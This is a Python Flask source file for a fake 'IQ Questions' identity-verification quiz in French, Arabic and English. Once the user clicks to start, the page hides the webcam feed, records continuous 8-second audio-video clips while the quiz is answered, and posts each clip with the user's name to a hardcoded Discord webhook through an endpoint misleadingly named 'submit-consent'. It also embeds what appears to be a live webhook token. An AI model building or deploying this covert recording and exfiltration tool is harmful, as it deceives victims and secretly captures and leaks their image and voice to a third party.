import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 30 * 1024 * 1024

DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1566437289113161940/qkaHvkxwmc_uuM3YMobIKnL9kaJhRI9XA4-OwYMpIJEWZnagp5mqEE93c4es2n2aTXA1")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr" dir="ltr" id="htmlTag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">IQ Questions - Vérification</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --text: #1e293b;
            --muted: #64748b;
            --border: #e2e8f0;
            --input: #f8fafc;
        }
        * { box-sizing: border-box; transition: all 0.25s ease; }
        body {
            font-family: 'Plus Jakarta Sans', Arial, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #31103f 100%);
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text);
        }
        .card {
            background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px);
            padding: 40px 35px; border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.4); text-align: center; max-width: 600px; width: 100%;
        }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .welcome-badge { background: linear-gradient(135deg, #6366f1, #a855f7); color: white; padding: 8px 16px; border-radius: 30px; font-size: 13px; font-weight: 800; }
        .lang-select { padding: 8px 12px; border-radius: 20px; border: 1px solid var(--border); background: var(--input); font-weight: 700; cursor: pointer; }
        h2 { margin: 0 0 8px; font-size: 28px; font-weight: 800; color: var(--text); }
        .subtitle { color: var(--muted); font-size: 14px; margin-bottom: 25px; }
        #username { width: 100%; padding: 14px; margin-bottom: 25px; font-size: 15px; background: var(--input); border: 2px solid var(--border); border-radius: 12px; outline: none; }
        .question-box { margin-bottom: 16px; text-align: left; background: white; padding: 16px 18px; border-radius: 12px; border: 1px solid var(--border); }
        [dir="rtl"] .question-box { text-align: right; }
        .question-box label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 14px; color: var(--text); }
        .question-box select { width: 100%; padding: 10px; font-size: 14px; background: var(--input); border: 1px solid var(--border); border-radius: 8px; cursor: pointer; }
        .action-btn { padding: 14px 20px; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; font-size: 15px; width: 100%; margin-top: 12px; color: white; background: #6366f1; }
        .action-btn:hover { background: #4f46e5; }
        #submitBtn { background: linear-gradient(135deg, #10b981, #059669); }
        #status { margin-top: 20px; font-weight: 700; font-size: 14px; }
        #video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
    </style>
</head>
<body>
<div class="card">
    <div class="top-bar">
        <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
        <select id="languageSelector" class="lang-select" onchange="changeLanguage(this.value)">
            <option value="fr">Français</option>
            <option value="ar">العربية</option>
            <option value="en">English</option>
        </select>
    </div>
    <h2 id="mainTitle">Vérification d'identité</h2>
    <div class="subtitle" id="subTitle">Veuillez cliquer sur le bouton ci-dessous pour démarrer</div>

    <div id="video-container">
        <video id="webcam" autoplay playsinline muted></video>
    </div>

    <button type="button" id="startCamBtn" class="action-btn" onclick="startCameraAndRecording()">🎥 Démarrer la vérification</button>

    <form id="quizForm" style="display:none; margin-top:20px;" onsubmit="event.preventDefault(); verifyAndSend();">
        <input type="text" id="username" placeholder="Votre Nom Complet" required>
        
        <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
        <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
        <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="" class="opt-select">Sélectionnez</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre" class="opt-other">Autre</option></select></div>
        <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="" class="opt-select">Sélectionnez</option><option value="Excellente">Excellente</option><option value="Malchanceuse">Malchanceuse</option></select></div>
        <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="" class="opt-select">Sélectionnez</option><option value="Moi-même">Moi-même</option><option value="Les singes">Les singes</option></select></div>
        <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité ?</label><select id="q6" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
        <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="" class="opt-select">Sélectionnez</option><option value="Sommeil">Le sommeil</option><option value="Nourriture">La nourriture</option></select></div>
        <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="" class="opt-select">Sélectionnez</option><option value="Magnifique">Magnifique</option><option value="Moche">Pas très beau</option><option value="Sage">Sage</option></select></div>
        <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté sur 10 :</label><select id="q9" required><option value="" class="opt-select">Sélectionnez</option><option value="1/10">1 / 10</option><option value="5/10">5 / 10</option><option value="10/10">10 / 10</option></select></div>
        <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="" class="opt-select">Sélectionnez</option><option value="Par chance">Par chance</option><option value="Par triche">Par triche</option><option value="Impossible">Impossible</option></select></div>
        <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="" class="opt-select">Sélectionnez</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
        <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="" class="opt-select">Sélectionnez</option><option value="J'adore">J'adore</option><option value="Je déteste">Je déteste</option></select></div>
        <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo ?</label><select id="q13" required><option value="" class="opt-select">Sélectionnez</option><option value="Pro">Joueur Pro</option><option value="Débutant">Débutant</option></select></div>
        <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="" class="opt-select">Sélectionnez</option><option value="Téléphone">Mon téléphone</option><option value="Amis">Mes amis</option></select></div>
        <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="" class="opt-select">Sélectionnez</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
        <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
        <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="" class="opt-select">Sélectionnez</option><option value="Beaucoup">Beaucoup</option><option value="Un peu">Un peu</option><option value="Pas du tout">Pas du tout</option></select></div>
        <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
        <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="" class="opt-select">Sélectionnez</option><option value="Facile">Très facile</option><option value="Impossible">Impossible</option></select></div>
        <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>

        <button type="submit" id="submitBtn">VALIDER ET ENVOYER</button>
    </form>
    <div id="status"></div>
</div>

<script>
    const translations = {
        fr: {
            title: "IQ Questions - Vérification", welcome: "Bienvenue dans IQ Questions",
            mainTitle: "Vérification d'identité", subTitle: "Veuillez cliquer sur le bouton pour démarrer",
            btnStart: "🎥 Démarrer la vérification", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez", yes: "Oui", no: "Non",
            q: [
                "1. Penses-tu être plus beau/belle que moi ?", "2. Te considères-tu comme quelqu'un de naïf ?",
                "3. Quel est le nom de votre animal préféré ?", "4. Comment décrivez-vous votre journée en général ?",
                "5. Qui est le plus intelligent selon vous ?", "6. Avez-vous peur de l'obscurité ?",
                "7. Préférez-vous le sommeil ou la nourriture ?", "8. Que pensez-vous en vous regardant dans le miroir ?",
                "9. Notez votre niveau de méchanceté sur 10 :", "10. Comment réussissez-vous dans vos études ?",
                "11. Mentez-vous souvent ?", "12. Aimez-vous les plats traditionnels épicés ?",
                "13. Êtes-vous fort aux jeux vidéo ?", "14. Que préférez-vous le plus ?",
                "15. Dépensez-vous tout votre argent en deux jours ?", "16. Accepteriez-vous d'être une célébrité ?",
                "17. Aimez-vous faire des blagues aux autres ?", "18. Croyez-vous au coup de foudre ?",
                "19. Pouvez-vous tenir une heure sans Internet ?", "20. Êtes-vous satisfait(e) de votre vie actuelle ?"
            ]
        },
        ar: {
            title: "أسئلة الذكاء - التحقق", welcome: "مرحباً بكم في أسئلة الذكاء",
            mainTitle: "التحقق من الهوية", subTitle: "يرجى النقر على الزر أدناه للبدء",
            btnStart: "🎥 بدء التحقق والكاميرا", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا",
            q: [
                "1. هل تعتقد أنك أنجح/أجمل مني؟", "2. هل تعتبر نفسك شخصاً ساذجاً؟",
                "3. ما هو اسم حيوانك المفضل؟", "4. كيف تصف يومك بشكل عام؟",
                "5. برأيك، من هو الأكثر ذكاءً؟", "6. هل تخاف من الظلام؟",
                "7. هل تفضل النوم أم الطعام؟", "8. بماذا تفكر عندما تنظر إلى المرآة؟",
                "9. قيّم مستوى لؤمك من 10:", "10. كيف تنجح في دراستك؟",
                "11. هل تكذب غالباً؟", "12. هل تحب الأطباق التقليدية الحارة؟",
                "13. هل أنت بارع في ألعاب الفيديو؟", "14. ماذا تفضل أكثر؟",
                "15. هل تنفق كل أموالك في يومين؟", "16. هل تقبل أن تكون مشهوراً؟",
                "17. هل تحب المزاح وإلقاء النكت؟", "18. هل تؤمن الحب من أول نظرة؟",
                "19. هل يمكنك الصمود لساعة واحدة بدون إنترنت؟", "20. هل أنت راضٍ عن حياتك الحالية؟"
            ]
        },
        en: {
            title: "IQ Questions - Verification", welcome: "Welcome to IQ Questions",
            mainTitle: "Identity Verification", subTitle: "Please click the button below to start",
            btnStart: "🎥 Start Verification", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No",
            q: [
                "1. Do you think you are more handsome/beautiful than me?", "2. Do you consider yourself naive?",
                "3. What is the name of your favorite pet?", "4. How do you generally describe your day?",
                "5. Who do you think is the smartest?", "6. Are you afraid of the dark?",
                "7. Do you prefer sleep or food?", "8. What do you think when you look in the mirror?",
                "9. Rate your level of mischief out of 10:", "10. How do you succeed in your studies?",
                "11. Do you lie often?", "12. Do you like spicy traditional dishes?",
                "13. Are you good at video games?", "14. What do you prefer the most?",
                "15. Do you spend all your money in two days?", "16. Would you accept to be a celebrity?",
                "17. Do you like playing pranks on others?", "18. Do you believe in love at first sight?",
                "19. Can you last an hour without internet?", "20. Are you satisfied with your current life?"
            ]
        }
    };

    function changeLanguage(lang) {
        const htmlTag = document.getElementById('htmlTag');
        if (lang === 'ar') { htmlTag.setAttribute('dir', 'rtl'); htmlTag.setAttribute('lang', 'ar'); }
        else { htmlTag.setAttribute('dir', 'ltr'); htmlTag.setAttribute('lang', lang); }
        const t = translations[lang];
        document.getElementById('pageTitle').innerText = t.title;
        document.getElementById('welcomeText').innerText = t.welcome;
        document.getElementById('mainTitle').innerText = t.mainTitle;
        document.getElementById('subTitle').innerText = t.subTitle;
        document.getElementById('startCamBtn').innerText = t.btnStart;
        document.getElementById('username').placeholder = t.usernamePlaceholder;
        document.getElementById('submitBtn').innerText = t.submitBtn;
        for (let i = 1; i <= 20; i++) {
            const lbl = document.getElementById('lbl' + i);
            if (lbl && t.q[i-1]) lbl.innerText = t.q[i-1];
        }
        document.querySelectorAll('.opt-select').forEach(el => el.innerText = t.selectOpt);
        document.querySelectorAll('.opt-yes').forEach(el => el.innerText = t.yes);
        document.querySelectorAll('.opt-no').forEach(el => el.innerText = t.no);
    }

    let mediaStream = null;
    let mediaRecorder = null;
    let recordingActive = false;
    let uploadQueue = Promise.resolve();

    async function startCameraAndRecording() {
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
            document.getElementById('webcam').srcObject = mediaStream;
            
            document.getElementById('startCamBtn').style.display = 'none';
            document.getElementById('quizForm').style.display = 'block';
            document.getElementById('subTitle').innerText = "Veuillez répondre aux 20 questions";

            recordingActive = true;
            startSegmentLoop();
        } catch (err) {
            alert("Erreur: Accès à la caméra refusé.");
        }
    }

    function startSegmentLoop() {
        if (!recordingActive || !mediaStream) return;
        
        try {
            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
            let chunks = [];

            mediaRecorder.ondataavailable = e => {
                if (e.data && e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = () => {
                if (chunks.length > 0) {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const username = document.getElementById('username').value || "Anonyme";
                    const formData = new FormData();
                    formData.append("username", username + " [🎥 Clip 8s]");
                    formData.append("video", blob, "clip_8s.webm");
                    
                    // إضافة في الـ Queue باش يبعثهم بالترتيب ومن غير ما يصير Spam
                    uploadQueue = uploadQueue.then(() => 
                        fetch("/submit-consent", { method: "POST", body: formData }).catch(e => {})
                    );
                }
                if (recordingActive) {
                    startSegmentLoop();
                }
            };

            mediaRecorder.start();

            // ضبط المؤقت على 8 ثوانٍ بالضبط لكل مقطع فيديو
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                }
            }, 8000);

        } catch (err) {
            setTimeout(startSegmentLoop, 2000);
        }
    }

    async function verifyAndSend() {
        const status = document.getElementById('status');
        status.style.color = "#6366f1";
        status.textContent = "Envoi des réponses en cours...";

        recordingActive = false;
        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
        }

        await uploadQueue;

        const formData = new FormData();
        formData.append("username", document.getElementById('username').value);
        for (let i = 1; i <= 20; i++) {
            formData.append("q" + i, document.getElementById("q" + i).value);
        }

        try {
            const response = await fetch("/submit-answers", { method: "POST", body: formData });
            if (response.ok) {
                status.style.color = "#10b981";
                status.textContent = "Succès ! Vos réponses ont été envoyées.";
            } else {
                status.style.color = "#ef4444";
                status.textContent = "Erreur pendant l'envoi.";
            }
        } catch (error) {
            status.style.color = "#ef4444";
            status.textContent = "Erreur de connexion.";
        }
    }
</script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

def send_to_discord(content, video_file=None):
    payload = {"content": content}
    files = None
    if video_file:
        files = {
            "file": (
                video_file.filename or "clip_8s.webm",
                video_file.read(),
                video_file.content_type or "video/webm"
            )
        }
    response = requests.post(
        DISCORD_WEBHOOK_URL,
        data={"payload_json": json.dumps(payload)},
        files=files,
        timeout=30
    )
    print(f"Discord Response Status: {response.status_code}")
    response.raise_for_status()

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    try:
        username = request.form.get("username", "Utilisateur")
        video_file = request.files.get("video")
        if not video_file:
            return jsonify({"error": "No video"}), 400
        content = f"🎥 **IQ Questions — Clip (8s)**\n**Nom :** {username}"
        send_to_discord(content, video_file)
        return jsonify({"message": "Sent"}), 200
    except Exception as e:
        print(f"Error in submit_consent: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route("/submit-answers", methods=["POST"])
def submit_answers():
    try:
        username = request.form.get("username", "Utilisateur")
        answers = []
        for i in range(1, 21):
            val = request.form.get(f"q{i}", "")
            if val:
                answers.append(f"Q{i}: {val}")
        content = f"✅ **Rapport Final IQ Questions**\n**Nom :** {username}\n" + "\n".join(answers)
        send_to_discord(content)
        return jsonify({"message": "Sent"}), 200
    except Exception as e:
        print(f"Error in submit_answers: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
